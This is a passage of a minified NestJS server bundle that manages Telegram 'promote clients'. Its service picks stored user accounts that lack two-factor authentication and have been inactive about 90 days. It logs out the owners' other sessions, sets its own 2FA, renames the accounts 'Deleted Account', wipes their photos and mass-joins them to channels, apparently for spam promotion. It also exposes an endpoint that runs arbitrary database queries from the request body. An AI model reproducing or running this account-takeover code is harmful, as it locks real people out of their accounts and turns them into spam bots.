0),n([(0,r.ApiPropertyOptional)({description:"availableDate of the promoteClient",example:"2023-06-22"}),(0,a.IsOptional)(),(0,a.IsString)(),o("design:type",String)],s.prototype,"availableDate",void 0),n([(0,r.ApiPropertyOptional)({description:"Channel Count",example:23,type:Number}),(0,a.IsNumber)(),o("design:type",Number)],s.prototype,"channels",void 0)},8150:(e,t,i)=>{Object.defineProperty(t,"__esModule",{value:!0}),t.UpdatePromoteClientDto=void 0;const n=i(9742),o=i(8977);class r extends((0,n.PartialType)(o.CreatePromoteClientDto)){}t.UpdatePromoteClientDto=r},2581:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},o=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},r=this&&this.__param||function(e,t){return function(i,n){t(i,n,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.PromoteClientController=void 0;const a=i(3563),s=i(9742),c=i(1870),l=i(8977),p=i(3993),d=i(8150);let u=class{constructor(e){this.clientService=e}async create(e){return this.clientService.create(e)}async search(e){return this.clientService.search(e)}async joinChannelsforPromoteClients(){return this.clientService.joinchannelForPromoteClients()}async checkpromoteClients(){return this.clientService.checkPromoteClients(),"initiated Checking"}async addNewUserstoPromoteClients(e){return this.clientService.addNewUserstoPromoteClients(e.badIds,e.goodIds),"initiated Checking"}async findAll(){return this.clientService.findAll()}async setAsPromoteClient(e){return await this.clientService.setAsPromoteClient(e)}async findOne(e){return this.clientService.findOne(e)}async update(e,t){return this.clientService.update(e,t)}async createdOrupdate(e,t){return this.clientService.createOrUpdate(e,t)}async remove(e){return this.clientService.remove(e)}async executeQuery(e){try{return await this.clientService.executeQuery(e)}catch(e){throw e}}};t.PromoteClientController=u,n([(0,a.Post)(),(0,s.ApiOperation)({summary:"Create user data"}),r(0,(0,a.Body)()),o("design:type",Function),o("design:paramtypes",[l.CreatePromoteClientDto]),o("design:returntype",Promise)],u.prototype,"create",null),n([(0,a.Get)("search"),(0,s.ApiOperation)({summary:"Search user data"}),(0,s.ApiQuery)({name:"mobile",required:!1,description:"Mobile number"}),(0,s.ApiQuery)({name:"firstName",required:!1,description:"First name"}),(0,s.ApiQuery)({name:"lastName",required:!1,description:"Last name"}),(0,s.ApiQuery)({name:"username",required:!1,description:"Username"}),r(0,(0,a.Query)()),o("design:type",Function),o("design:paramtypes",[p.SearchPromoteClientDto]),o("design:returntype",Promise)],u.prototype,"search",null),n([(0,a.Get)("joinChannelsForPromoteClients"),(0,s.ApiOperation)({summary:"Join Channels for PromoteClients"}),o("design:type",Function),o("design:paramtypes",[]),o("design:returntype",Promise)],u.prototype,"joinChannelsforPromoteClients",null),n([(0,a.Get)("checkPromoteClients"),(0,s.ApiOperation)({summary:"Check Promote Clients"}),o("design:type",Function),o("design:paramtypes",[]),o("design:returntype",Promise)],u.prototype,"checkpromoteClients",null),n([(0,a.Post)("addNewUserstoPromoteClients"),(0,s.ApiOperation)({summary:"Add New Users to Promote Clients"}),(0,s.ApiBody)({type:Object}),r(0,(0,a.Body)()),o("design:type",Function),o("design:paramtypes",[Object]),o("design:returntype",Promise)],u.prototype,"addNewUserstoPromoteClients",null),n([(0,a.Get)(),(0,s.ApiOperation)({summary:"Get all user data"}),o("design:type",Function),o("design:paramtypes",[]),o("design:returntype",Promise)],u.prototype,"findAll",null),n([(0,a.Get)("SetAsPromoteClient/:mobile"),(0,s.ApiOperation)({summary:"Set as Promote Client"}),(0,s.ApiParam)({name:"mobile",description:"User mobile number",type:String}),r(0,(0,a.Param)("mobile")),o("design:type",Function),o("design:paramtypes",[String]),o("design:returntype",Promise)],u.prototype,"setAsPromoteClient",null),n([(0,a.Get)(":mobile"),(0,s.ApiOperation)({summary:"Get user data by ID"}),r(0,(0,a.Param)("mobile")),o("design:type",Function),o("design:paramtypes",[String]),o("design:returntype",Promise)],u.prototype,"findOne",null),n([(0,a.Patch)(":mobile"),(0,s.ApiOperation)({summary:"Update user data by ID"}),r(0,(0,a.Param)("mobile")),r(1,(0,a.Body)()),o("design:type",Function),o("design:paramtypes",[String,d.UpdatePromoteClientDto]),o("design:returntype",Promise)],u.prototype,"update",null),n([(0,a.Put)(":mobile"),(0,s.ApiOperation)({summary:"Update user data by ID"}),r(0,(0,a.Param)("mobile")),r(1,(0,a.Body)()),o("design:type",Function),o("design:paramtypes",[String,d.UpdatePromoteClientDto]),o("design:returntype",Promise)],u.prototype,"createdOrupdate",null),n([(0,a.Delete)(":mobile"),(0,s.ApiOperation)({summary:"Delete user data by ID"}),r(0,(0,a.Param)("mobile")),o("design:type",Function),o("design:paramtypes",[String]),o("design:returntype",Promise)],u.prototype,"remove",null),n([(0,a.Post)("query"),(0,s.ApiOperation)({summary:"Execute a custom MongoDB query"}),(0,s.ApiBody)({type:Object}),r(0,(0,a.Body)()),o("design:type",Function),o("design:paramtypes",[Object]),o("design:returntype",Promise)],u.prototype,"executeQuery",null),t.PromoteClientController=u=n([(0,s.ApiTags)("Promote Clients"),(0,a.Controller)("promoteclients"),o("design:paramtypes",[c.PromoteClientService])],u)},1373:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a};Object.defineProperty(t,"__esModule",{value:!0}),t.PromoteClientModule=void 0;const o=i(3563),r=i(5839),a=i(1870),s=i(2581),c=i(4013),l=i(282),p=i(3322),d=i(7422),u=i(8009),m=i(5774),g=i(1324),h=i(8421);let y=class{};t.PromoteClientModule=y,t.PromoteClientModule=y=n([(0,o.Module)({imports:[m.initModule,r.MongooseModule.forFeature([{name:"promoteClientModule",schema:c.PromoteClientSchema,collection:"promoteClients"}]),(0,o.forwardRef)((()=>l.TelegramModule)),(0,o.forwardRef)((()=>d.UsersModule)),(0,o.forwardRef)((()=>p.ActiveChannelsModule)),(0,o.forwardRef)((()=>u.ClientModule)),(0,o.forwardRef)((()=>g.ChannelsModule)),(0,o.forwardRef)((()=>h.BufferClientModule))],controllers:[s.PromoteClientController],providers:[a.PromoteClientService],exports:[a.PromoteClientService]})],y)},1870:function(e,t,i){var n,o=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},r=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},a=this&&this.__param||function(e,t){return function(i,n){t(i,n,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.PromoteClientService=void 0;const s=i(9597),c=i(3563),l=i(5839),p=i(6037),d=i(2995),u=i(7385),m=i(9127),g=i(9155),h=i(5562),y=i(4374),f=i(3235),v=i(9647),b=i(6250),w=i(3653);let P=n=class{constructor(e,t,i,o,r,a,s){this.promoteClientModel=e,this.telegramService=t,this.usersService=i,this.activeChannelsService=o,this.clientService=r,this.channelsService=a,this.bufferClientService=s,this.logger=new c.Logger(n.name),this.joinChannelMap=new Map,this.leaveChannelMap=new Map,this.isLeaveChannelProcessing=!1,this.isJoinChannelProcessing=!1,this.JOIN_CHANNEL_INTERVAL=24e4}async create(e){return new this.promoteClientModel(e).save()}async findAll(){return this.promoteClientModel.find().exec()}async findOne(e,t=!0){const i=(await this.promoteClientModel.findOne({mobile:e}).exec())?.toJSON();if(!i&&t)throw new c.NotFoundException(`PromoteClient with mobile ${e} not found`);return i}async update(e,t){const i=await this.promoteClientModel.findOneAndUpdate({mobile:e},{$set:t},{new:!0,upsert:!0,returnDocument:"after"}).exec();if(!i)throw new c.NotFoundException(`User with mobile ${e} not found`);return i}async createOrUpdate(e,t){const i=(await this.promoteClientModel.findOne({mobile:e}).exec())?.toJSON();return i?(console.log("Updating"),this.update(i.mobile,t)):(console.log("creating"),this.create(t))}async remove(e){if(await(0,v.fetchWithTimeout)(`${(0,b.notifbot)()}&text=${encodeURIComponent(`Deleting Promote Client : ${e}`)}`),0===(await this.promoteClientModel.deleteOne({mobile:e}).exec()).deletedCount)throw new c.NotFoundException(`PromoteClient with mobile ${e} not found`)}async search(e){return console.log(e),e.firstName&&(e.firstName={$regex:new RegExp(e.firstName,"i")}),console.log(e),this.promoteClientModel.find(e).exec()}async executeQuery(e,t,i,n){try{if(!e)throw new c.BadRequestException("Query is invalid.");const o=this.promoteClientModel.find(e);return t&&o.sort(t),i&&o.limit(i),n&&o.skip(n),await o.exec()}catch(e){throw new c.InternalServerErrorException(e.message)}}removeFromPromoteMap(e){this.joinChannelMap.delete(e)}clearPromoteMap(){console.log("PromoteMap cleared"),this.joinChannelMap.clear()}async joinchannelForPromoteClients(e=!0){if(this.telegramService.getActiveClientSetup())return this.logger.warn("Ignored active check for promote channels as an active client setup exists"),"Active client setup exists, skipping promotion";this.logger.log("Starting join channel process"),this.clearJoinChannelInterval(),this.clearLeaveChannelInterval();try{const t=e?[]:Array.from(this.joinChannelMap.keys());this.logger.debug(`Using existing keys: ${t.join(", ")}`),await w.connectionManager.disconnectAll(),await(0,u.sleep)(2e3);const i=await this.promoteClientModel.find({channels:{$lt:300},mobile:{$nin:t}}).sort({channels:1}).limit(4);if(this.logger.debug(`Found ${i.length} clients to process`),i.length>0)for(const e of i)try{this.logger.debug(`Processing client: ${e.mobile}`);const t=await w.connectionManager.getClient(e.mobile,{autoDisconnect:!1,handler:!1}),i=await t.channelInfo(!0);if(this.logger.debug(`${e.mobile}: Found ${i.ids.length} existing channels`),await this.update(e.mobile,{channels:i.ids.length}),i.canSendFalseCount<10)if(i.ids.length<220){this.logger.debug(`${e.mobile}: Getting channels from channels service`);const t=await this.channelsService.getActiveChannels(150,0,i.ids);this.joinChannelMap.set(e.mobile,t),this.joinChannelQueue()}else{this.logger.debug(`${e.mobile}: Getting channels from active channels service`);const t=await this.activeChannelsService.getActiveChannels(150,0,i.ids);this.joinChannelMap.set(e.mobile,t),this.joinChannelQueue()}else this.logger.debug(`${e.mobile}: Too many channels with no send permissions, queueing for leave: ${i.canSendFalseChats.length}`),this.leaveChannelMap.set(e.mobile,i.canSendFalseChats),this.leaveChannelQueue()}catch(t){const i=(0,f.parseError)(t);this.logger.error(`Error processing client ${e.mobile}:`,i),"SESSION_REVOKED"!==t.message&&"AUTH_KEY_UNREGISTERED"!==t.message&&"USER_DEACTIVATED"!==t.message&&"USER_DEACTIVATED_BAN"!==t.message||(this.logger.warn(`${e.mobile}: Session invalid, removing client`),await this.remove(e.mobile))}finally{w.connectionManager.unregisterClient(e.mobile)}return this.logger.log(`Join channel process triggered successfully for ${i.length} clients`),`Initiated Joining channels for ${i.length}`}catch(e){throw this.logger.error("Error during joinchannelForPromoteClients:",e),this.clearJoinChannelInterval(),this.clearLeaveChannelInterval(),new Error("Failed to initiate channel joining process")}}async joinChannelQueue(){this.isJoinChannelProcessing||this.joinChannelIntervalId?this.logger.warn("Join channel process is already running, instance:",this.joinChannelIntervalId):0!==Array.from(this.joinChannelMap.keys()).length?(this.isJoinChannelProcessing=!0,this.joinChannelIntervalId=setInterval((async()=>{try{const e=Array.from(this.joinChannelMap.keys());if(0===e.length)return this.logger.log("Join channel map is empty, clearing interval"),void this.clearJoinChannelInterval();const t=setTimeout((()=>{this.logger.error("Join channel interval processing timeout"),this.clearJoinChannelInterval()}),this.JOIN_CHANNEL_INTERVAL-1e3);this.logger.debug(`Processing join channel interval at ${(new Date).toISOString()}`);for(const t of e){const e=this.joinChannelMap.get(t);if(!e||0===e.length){this.logger.debug(`No more channels to join for ${t}, removing from map`),this.removeFromPromoteMap(t);continue}const i=e.shift();e.length>0?(this.logger.debug(`${t}: Pending channels to join: ${e.length}`),this.joinChannelMap.set(t,e)):this.removeFromPromoteMap(t);try{await w.connectionManager.getClient(t,{autoDisconnect:!1,handler:!1}),this.logger.debug(`${t}: Attempting to join channel: @${i.username}`),await this.telegramService.tryJoiningChannel(t,i)}catch(e){const n=(0,f.parseError)(e,`${t} @${i.username} Outer Err ERR: `,!1);if(this.logger.error(`${t}: Error joining @${i.username}:`,n),"FloodWaitError"===n.error||"CHANNELS_TOO_MUCH"===e.errorMessage){this.logger.warn(`${t}: FloodWaitError or too many channels, handling...`),this.removeFromPromoteMap(t);const e=await this.telegramService.getChannelInfo(t,!0);await this.update(t,{channels:e.ids.length})}"SESSION_REVOKED"!==e.errorMessage&&"AUTH_KEY_UNREGISTERED"!==e.errorMessage&&"USER_DEACTIVATED"!==e.errorMessage&&"USER_DEACTIVATED_BAN"!==e.errorMessage||(this.logger.error(`Session invalid for ${t}, removing client`),await this.remove(t))}finally{await w.connectionManager.unregisterClient(t)}}clearTimeout(t)}catch(e){this.logger.error("Error in join channel interval:",e),this.clearJoinChannelInterval()}}),this.JOIN_CHANNEL_INTERVAL),this.logger.debug(`Started join channel queue with interval ID: ${this.joinChannelIntervalId}`)):this.logger.debug("No channels to join, skipping queue")}clearJoinChannelInterval(){this.joinChannelIntervalId&&(this.logger.debug("Clearing join channel interval"),clearInterval(this.joinChannelIntervalId),this.joinChannelIntervalId=null,this.isJoinChannelProcessing=!1,this.joinChannelMap.size>0&&setTimeout((()=>{this.logger.debug("Triggering join channel process after timeout"),this.joinchannelForPromoteClients(!1)}),3e4))}removeFromLeaveMap(e){this.logger.debug(`Removing mobile ${e} from leave map`),this.leaveChannelMap.delete(e),0===this.leaveChannelMap.size&&(this.logger.log("Leave map is now empty"),this.clearLeaveChannelInterval())}clearLeaveMap(){this.logger.debug("Clearing entire leave map"),this.leaveChannelMap.clear(),this.clearLeaveChannelInterval()}async leaveChannelQueue(){this.isLeaveChannelProcessing||this.leaveChannelIntervalId?this.logger.warn("Leave channel process is already running, instance:",this.leaveChannelIntervalId):0!==Array.from(this.leaveChannelMap.keys()).length?(this.isLeaveChannelProcessing=!0,this.leaveChannelIntervalId=setInterval((async()=>{try{const e=Array.from(this.leaveChannelMap.keys());if(0===e.length)return this.logger.debug("Leave map is empty, clearing interval"),void this.clearLeaveChannelInterval();const t=setTimeout((()=>{this.logger.error("Leave channel interval processing timeout"),this.clearLeaveChannelInterval()}),59e3);this.logger.debug(`Processing leave channel queue at ${(new Date).toISOString()}, ${e.length} clients remaining, interval:${this.leaveChannelIntervalId}`);for(const t of e){this.logger.debug(`Processing leave channels for mobile: ${t}`);const e=this.leaveChannelMap.get(t);if(!e||0===e.length){this.logger.debug(`No channels to leave for mobile: ${t}`),this.removeFromLeaveMap(t);continue}const i=e.splice(0,10);e.length>0?(this.logger.debug(`${t}: Processing ${i.length} channels, ${e.length} remaining`),this.leaveChannelMap.set(t,e)):this.removeFromLeaveMap(t);try{const e=await w.connectionManager.getClient(t,{autoDisconnect:!1,handler:!1});this.logger.debug(`${t}: Attempting to leave ${i.length} channels`),await e.leaveChannels(i),this.logger.debug(`${t}: Successfully left ${i.length} channels`)}catch(e){const i=(0,f.parseError)(e);this.logger.error(`Error in leave channel process for ${t}:`,i),"SESSION_REVOKED"!==i.message&&"AUTH_KEY_UNREGISTERED"!==i.message&&"USER_DEACTIVATED"!==i.message&&"USER_DEACTIVATED_BAN"!==i.message||(this.logger.warn(`${t}: Session invalid, removing client`),await this.remove(t),this.removeFromLeaveMap(t))}finally{await w.connectionManager.unregisterClient(t)}}clearTimeout(t)}catch(e){this.logger.error("Error in leave channel interval:",e),this.clearLeaveChannelInterval()}}),6e4),this.logger.debug(`Started leave channel queue with interval ID: ${this.leaveChannelIntervalId}`)):this.logger.debug("No channels to leave, not starting queue")}clearLeaveChannelInterval(){this.leaveChannelIntervalId&&(this.logger.debug(`Clearing leave channel interval: ${this.leaveChannelIntervalId}`),clearInterval(this.leaveChannelIntervalId),this.leaveChannelIntervalId=null),this.isLeaveChannelProcessing=!1,this.logger.debug("Leave channel interval cleared and processing flag reset")}async setAsPromoteClient(e,t=new Date(Date.now()-864e5).toISOString().split("T")[0]){const i=(await this.usersService.search({mobile:e,expired:!1}))[0];if(!i)throw new c.BadRequestException("user not found");if(await this.findOne(e,!1))throw new c.ConflictException("PromoteClient already exist");const n=await this.clientService.findAll(),o=n.map((e=>e?.mobile)),r=n.flatMap((e=>e?.promoteMobile));if(o.includes(e)||r.includes(e))throw new c.BadRequestException("Number is a Active Client");{const n=await w.connectionManager.getClient(e,{autoDisconnect:!1});try{await n.set2fa(),await(0,u.sleep)(15e3),await n.updateUsername(""),await(0,u.sleep)(3e3),await n.updatePrivacyforDeletedAccount(),await(0,u.sleep)(3e3),await n.updateProfile("Deleted Account","Deleted Account"),await(0,u.sleep)(3e3),await n.deleteProfilePhotos();const o=await this.telegramService.getChannelInfo(e,!0),r={tgId:i.tgId,lastActive:"default",mobile:i.mobile,availableDate:t,channels:o.ids.length};await this.promoteClientModel.findOneAndUpdate({tgId:i.tgId},{$set:r},{new:!0,upsert:!0}).exec()}catch(e){const t=(0,f.parseError)(e);throw new c.HttpException(t.message,t.status)}return await w.connectionManager.unregisterClient(e),"Client set as promote successfully"}}async checkPromoteClients(){if(this.telegramService.getActiveClientSetup())console.log("ignored active check promote channels as active client setup exists");else{await w.connectionManager.disconnectAll(),await(0,u.sleep)(2e3);const e=await this.findAll();let t=[];const i=[];if(e.length<80)for(let t=0;t<80-e.length&&i.length<4;t++)i.push(t.toString());const n=await this.clientService.findAll(),o=await this.bufferClientService.findAll(),r=[...n.map((e=>e.mobile)),...n.flatMap((e=>e.promoteMobile))],a=o.map((e=>e.mobile));new Date(Date.now()).toISOString().split("T")[0];for(const n of e)if(r.includes(n.mobile)||a.includes(n.mobile))console.log("Number is a Active Client"),t.push(n.mobile),this.remove(n.mobile);else try{const e=await w.connectionManager.getClient(n.mobile,{autoDisconnect:!1,handler:!0}),o=await e.getMe();o.username&&(await this.telegramService.updateUsername(n.mobile,""),await(0,u.sleep)(2e3)),"Deleted Account"!==o.firstName&&(await this.telegramService.updateNameandBio(n.mobile,"Deleted Account",""),await(0,u.sleep)(2e3)),await this.telegramService.deleteProfilePhotos(n.mobile),!await e.hasPassword()&&i.length<4?(console.log("Client does not have password"),i.push(n.mobile)):(console.log(n.mobile," :  ALL Good"),t.push(n.mobile)),await this.telegramService.removeOtherAuths(n.mobile),await(0,u.sleep)(2e3)}catch(e){(0,f.parseError)(e),i.push(n.mobile),this.remove(n.mobile)}finally{await w.connectionManager.unregisterClient(n.mobile)}t=[...t,...r,...a],console.log("GoodIds: ",t.length,"BadIds : ",i.length),this.addNewUserstoPromoteClients(i,t)}}async addNewUserstoPromoteClients(e,t){const i=new Date(Date.now()-7776e6).toISOString().split("T")[0],n=await this.usersService.executeQuery({mobile:{$nin:t},twoFA:!1,expired:!1,lastActive:{$lt:i},totalChats:{$gt:250}},{tgId:1},e.length+3);for(console.log("New promote documents to be added: ",n.length);e.length>0&&n.length>0;){const t=n.shift();try{try{const i=await w.connectionManager.getClient(t.mobile,{autoDisconnect:!1}),n=await i.hasPassword();if(console.log("hasPassword: ",n),n)console.log("Failed to Update as PromoteClient has Password"),await this.usersService.update(t.tgId,{twoFA:!0}),await w.connectionManager.unregisterClient(t.mobile);else{await i.removeOtherAuths(),await i.set2fa(),console.log("waiting for setting 2FA"),await(0,u.sleep)(3e4),await i.updateUsername(""),await(0,u.sleep)(3e3),await i.updatePrivacyforDeletedAccount(),await(0,u.sleep)(3e3),await i.updateProfile("Deleted Account","Deleted Account"),await(0,u.sleep)(3e3),await i.deleteProfilePhotos();const n=await i.channelInfo(!0);console.log("Inserting Document");const o={tgId:t.tgId,lastActive:"today",mobile:t.mobile,availableDate:new Date(Date.now()-864e5).toISOString().split("T")[0],channels:n.ids.length};await this.create(o),await this.usersService.update(t.tgId,{twoFA:!0}),console.log("=============Created PromoteClient============="),await w.connectionManager.unregisterClient(t.mobile),e.pop()}}catch(e){(0,f.parseError)(e),await w.connectionManager.unregisterClient(t.mobile)}}catch(e){(0,f.parseError)(e),console.error("An error occurred:",e)}await w.connectionManager.unregisterClient(t.mobile)}setTimeout((()=>{this.joinchannelForPromoteClients()}),12e4)}};t.PromoteClientService=P,t.PromoteClientService=P=n=o([(0,c.Injectable)(),a(0,(0,l.InjectModel)("promoteClientModule")),a(1,(0,c.Inject)((0,c.forwardRef)((()=>d.TelegramService)))),a(2,(0,c.Inject)((0,c.forwardRef)((()=>m.UsersService)))),a(3,(0,c.Inject)((0,c.forwardRef)((()=>g.ActiveChannelsService)))),a(4,(0,c.Inject)((0,c.forwardRef)((()=>h.ClientService)))),a(5,(0,c.Inject)((0,c.forwardRef)((()=>g.ActiveChannelsService)))),a(6,(0,c.Inject)((0,c.forwardRef)((()=>y.BufferClientService)))),r("design:paramtypes",[p.Model,d.TelegramService,m.UsersService,g.ActiveChannelsService,h.ClientService,s.ChannelsService,y.BufferClientService])],P)},4013:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},o=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.PromoteClientSchema=t.PromoteClient=void 0;const r=i(5839);let a=class{};t.PromoteClient=a,n([(0,r.Prop)({required:!0}),o("design:type",String)],a.prototype,"tgId",void 0),n([(0,r.Prop)({required:!0,unique:!0}),o("design:type",String)],a.prototype,"mobile",void 0),n([(0,r.Prop)({required:!0}),o("design:type",String)],a.prototype,"lastActive",void 0),n([(0,r.Prop)({required:!0}),o("design:type",String)],a.prototype,"availableDate",void 0),n([(0,r.Prop)({required:!0,type:Number}),o("design:type",Number)],a.prototype,"channels",void 0),t.PromoteClient=a=n([(0,r.Schema)({collection:"promoteClients",versionKey:!1,autoIndex:!0,timestamps:!0,toJSON:{virtuals:!0,transform:(e,t)=>{delete t._id}}})],a),t.PromoteClientSchema=r.SchemaFactory.createForClass(a)},4966:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},o=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},r=this&&this.__param||function(e,t){return function(i,n){t(i,n,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.PromoteMsgsController=void 0;const a=i(3563),s=i(9742),c=i(9199);let l=class{constructor(e){this.promoteMsgsService=e}async findOne(){return this.promoteMsgsService.findOne()}async update(e){return this.promoteMsgsService.update(e)}};t.PromoteMsgsController=l,n([(0,a.Get)(),(0,s.ApiOperation)({summary:"Get promote-msgs data"}),o("design:type",Function),o("design:paramtypes",[]),o("design:returntype",Promise)],l.prototype,"findOne",null),n([(0,a.Patch)(),(0,s.ApiOperation)({summary:"Update promote-msgs"}),(0,s.ApiBody)({type:Object}),r(0,(0,a.Body)()),o("design:type",Function),o("design:paramtypes",[Object]),o("design:returntype",Promise)],l.prototype,"update",null),t.PromoteMsgsController=l=n([(0,s.ApiTags)("Promote-msgs"),(0,a.Controller)("promote-msgs"),o("design:paramtypes",[c.PromoteMsgsService])],l)},5014:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a};Object.defineProperty(t,"__esModule",{value:!0}),t.PromoteMsgModule=void 0;const o=i(3563),r=i(5839),a=i(9199),s=i(4966),c=i(8213);let l=class{};t.PromoteMsgModule=l,t.PromoteMsgModule=l=n([(0,o.Global)(),(0,o.Module)({imports:[l,r.MongooseModule.forFeature([{name:"promotemsgModule",collection:"promoteMsgs",schema:c.PromoteMsgSchema}])],providers:[a.PromoteMsgsService],controllers:[s.PromoteMsgsController],exports:[a.PromoteMsgsService]})],l)},8213:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},o=this&&this.__importDefault||function(e){return e&&e.__esModule?e:{default:e}};Object.defineProperty(t,"__esModule",{value:!0}),t.PromoteMsgSchema=t.PromoteMsg=void 0;const r=i(5839),a=o(i(6037));let s=class{};t.PromoteMsg=s,t.PromoteMsg=s=n([(0,r.Schema)({versionKey:!1,autoIndex:!0,strict:!1,timestamps:!0,toJSON:{virtuals:!0,transform:(e,t)=>{delete t._id}}})],s),t.PromoteMsgSchema=r.SchemaFactory.createForClass(s),t.PromoteMsgSchema.add({type:a.default.Schema.Types.Mixed})},9199:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},o=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},r=this&&this.__param||function(e,t){return function(i,n){t(i,n,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.PromoteMsgsService=void 0;const a=i(3563),s=i(5839),c=i(6037);let l=class{constructor(e){this.promotemsgModel=e}async OnModuleInit(){console.log("Config Module Inited")}async findOne(){const e=(await this.promotemsgModel.findOne({},{_id:0}).exec())?.toJSON();if(!e)throw new a.NotFoundException("promotemsgModel not found");return e}async update(e){delete e._id;const t=await this.promotemsgModel.findOneAndUpdate({},{$set:{...e}},{new:!0,upsert:!0}).exec();if(!t)throw new a.NotFoundException("promotemsgModel not found");return t}};t.PromoteMsgsService=l,t.PromoteMsgsService=l=n([(0,a.Injectable)(),r(0,(0,s.InjectModel)("promotemsgModule")),o("design:paramtypes",[c.Model])],l)},5639:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},o=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.CreatePromoteStatDto=void 0;const r=i(9742);class a{}t.CreatePromoteStatDto=a,n([(0,r.ApiProperty)({example:"shruthi1",description:"Client ID"}),o("design:type",String)],a.prototype,"client",void 0),n([(0,r.ApiProperty)({example:{Girls_Chating_Group_07:4,girls_friends_chatting_group_01:14},description:"Data"}),o("design:type",Map)],a.prototype,"data",void 0),n([(0,r.ApiProperty)({example:552,description:"Total Count"}),o("design:type",Number)],a.prototype,"totalCount",void 0),n([(0,r.ApiProperty)({example:314,description:"Unique Channels"}),o("design:type",Number)],a.prototype,"uniqueChannels",void 0),n([(0,r.ApiProperty)({example:1719929752982,description:"Release Day"}),o("design:type",Number)],a.prototype,"releaseDay",void 0),n([(0,r.ApiProperty)({example:1719860106247,description:"Last Updated TimeStamp"}),o("design:type",Number)],a.prototype,"lastUpdatedTimeStamp",void 0),n([(0,r.ApiProperty)({example:!0,description:"Is Active"}),o("design:type",Boolean)],a.prototype,"isActive",void 0),n([(0,r.ApiProperty)({example:["And_Girls_Boys_Group_Chatting","Girls_Chating_Group_07"],description:"Channels"}),o("design:type",Array)],a.prototype,"channels",void 0)},7108:(e,t,i)=>{Object.defineProperty(t,"__esModule",{value:!0}),t.UpdatePromoteStatDto=void 0;const n=i(9742),o=i(5639);class r extends((0,n.PartialType)(o.CreatePromoteStatDto)){}t.UpdatePromoteStatDto=r},7317:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var 